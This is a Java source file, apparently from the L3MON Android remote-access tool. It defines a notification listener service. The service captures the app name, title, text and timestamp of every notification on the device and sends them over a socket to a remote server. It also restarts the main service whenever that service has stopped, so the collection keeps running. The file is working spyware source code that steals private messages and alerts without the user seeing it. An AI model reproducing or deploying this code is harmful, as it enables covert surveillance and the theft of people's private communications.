package com.etechd.l3mon;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.Notification;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

@SuppressLint({"NewApi", "OverrideAbstract"})
public class NotificationListener extends NotificationListenerService {

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            isMainServiceRunning();

            String appName = sbn.getPackageName();
            String title = new StringBuilder(sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE)).toString();
            CharSequence contentCs = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT);
            String content = "";
            if (contentCs != null) content = contentCs.toString();
            long postTime = sbn.getPostTime();
            String uniqueKey = sbn.getKey();

            JSONObject data = new JSONObject();
            data.put("appName", appName);
            data.put("title", title);
            data.put("content", "" + content);
            data.put("postTime", postTime);
            data.put("key", uniqueKey);
            IOSocket.getInstance().getIoSocket().emit("0xNO", data);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    // 检测主服务是否启动，没启动则启动
    private void isMainServiceRunning() {
        ComponentName componentName = new ComponentName(this, MainService.class);
        ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        boolean isRunning = false;
        List<ActivityManager.RunningServiceInfo> runningServiceInfo = activityManager.getRunningServices(Integer.MAX_VALUE);
        if (runningServiceInfo == null) {
            return;
        }
        for (ActivityManager.RunningServiceInfo service : runningServiceInfo) {
            if (service.service.equals(componentName)) {
                isRunning = true;
            }
        }

        if (!isRunning) {
            MainService.start();
        }
    }
}
